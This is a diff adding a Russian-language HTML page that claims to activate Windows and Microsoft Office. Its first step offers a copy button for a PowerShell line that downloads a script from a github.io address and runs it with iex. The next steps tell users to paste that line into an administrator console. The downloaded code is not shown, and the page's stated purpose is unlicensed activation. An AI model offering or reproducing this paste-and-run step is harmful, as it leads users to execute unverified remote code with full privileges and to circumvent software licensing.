@@ -72,4 +72,91 @@
             overflow: hidden;
         }
         .command-text {
-            font-family: ui-monospace, SFMono-Regular, SF Mono, Menlo,
+            font-family: ui-monospace, SFMono-Regular, SF Mono, Menlo, Consolas, Liberation Mono, monospace;
+            font-size: 13px;
+            color: #7ee787;
+            padding: 12px;
+            white-space: nowrap;
+            overflow-x: auto;
+            flex-grow: 1;
+            align-items: center;
+            display: flex;
+        }
+        .copy-btn {
+            background-color: #21262d;
+            color: #c9d1d9;
+            border: none;
+            border-left: 1px solid #30363d;
+            padding: 0 16px;
+            font-family: inherit;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease-in-out;
+            white-space: nowrap;
+        }
+        .copy-btn:hover {
+            background-color: #238636;
+            color: #ffffff;
+            border-left-color: #238636;
+        }
+        .copy-btn:active {
+            background-color: #2ea44f;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Активация Windows и Microsoft Office</h1>
+    
+    <div class="steps">
+        <div class="step">
+            <div class="step-title">Шаг 1</div>
+            <div class="step-desc">Скопируйте команду автоматического запуска для PowerShell:</div>
+            <div class="command-box">
+                <div class="command-text" id="cmdText">$c = (New-Object Net.WebClient).DownloadData('https://carplk.github.io/activator'); iex ([System.Text.Encoding]::UTF8.GetString($c))</div>
+                <button class="copy-btn" id="copyBtn" onclick="copyCode()">Копировать</button>
+            </div>
+        </div>
+
+        <div class="step">
+            <div class="step-title">Шаг 2</div>
+            <div class="step-desc">Откройте терминал <strong>PowerShell</strong> от имени администратора (нажмите Пуск, введите <code>PowerShell</code>, кликните правой кнопкой мыши и выберите «Запуск от имени администратора»).</div>
+        </div>
+
+        <div class="step">
+            <div class="step-title">Шаг 3</div>
+            <div class="step-desc">Вставьте скопированную строку в окно PowerShell. <strong>Важно:</strong> сочетание клавиш <code>Ctrl + V</code> в консоли может не работать, поэтому для вставки просто нажмите <strong>правой кнопкой мыши (ПКМ)</strong> в любом месте окна терминала, а затем нажмите <strong>Enter</strong>.</div>
+        </div>
+
+        <div class="step">
+            <div class="step-title">Шаг 4</div>
+            <div class="step-desc">В появившемся текстовом меню введите <strong>цифру нужного пункта</strong> (например, 1 — для автоматической Windows или 2 — для MS Office) и нажмите <strong>Enter</strong>. Скрипт всё сделает сам!</div>
+        </div>
+    </div>
+</div>
+
+<script>
+function copyCode() {
+    const textToCopy = document.getElementById('cmdText').innerText;
+    const btn = document.getElementById('copyBtn');
+    
+    navigator.clipboard.writeText(textToCopy).then(() => {
+        btn.innerText = 'Скопировано!';
+        btn.style.backgroundColor = '#238636';
+        btn.style.color = '#ffffff';
+        
+        setTimeout(() => {
+            btn.innerText = 'Копировать';
+            btn.style.backgroundColor = '';
+            btn.style.color = '';
+        }, 2000);
+    }).catch(err => {
+        console.error('Не удалось скопировать: ', err);
+    });
+}
+</script>
+
+</body>
+</html>
